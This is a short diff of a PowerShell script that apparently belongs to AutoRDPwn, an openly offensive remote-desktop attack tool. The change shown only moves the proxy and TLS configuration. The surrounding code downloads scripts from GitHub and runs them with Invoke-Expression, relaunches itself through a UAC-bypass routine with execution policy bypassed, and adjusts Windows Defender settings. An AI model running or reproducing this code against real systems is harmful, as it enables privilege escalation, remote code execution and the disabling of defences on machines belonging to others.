@@ -1,5 +1,6 @@
 ﻿[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8") ; $OSVersion = [Environment]::OSVersion.Platform
 $noadmin=$args[0] ; $nogui=$args[1] ; $lang=$args[2] ; $option=$args[4] ; $shadowoption=$args[6] ; $createuser=$args[8] ; $noclean=$args[9] ; if($args[1,2,3,4,5,6]){ if(!$args[7]) { Write-Host "Not enough parameters!" -ForegroundColor Red ; exit }}
+[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy() ; [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials ; $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12' ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
 if($OSVersion -like 'Win*'){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/AutoBypass.ps1') ; Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/NinjaStyle.ps1')
 if($noadmin -like '-noadmin') { $null } else { if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Bypass-UAC "powershell.exe -sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $args " ; exit }}
 
@@ -80,7 +81,6 @@ function Remove-Exclusions {
     Set-MpPreference -DisableIOAVProtection 0 2>&1> $null ; Clear-Item -Path WSMan:localhostClientTrustedHosts -Force 2>&1> $null 
     Set-MpPreference -SubmitSamplesConsent 1 2>&1> $null ; Set-MpPreference -MAPSReporting 2 2>&1> $null ; Set-MpPreference -DisableScriptScanning 0 2>&1> $null }
 
-    $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12' ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
     $system = (Get-WmiObject Win32_OperatingSystem).OSArchitecture ; if(!$nogui){ 
     $help = "The detailed guide of use can be found at the following link:"
 
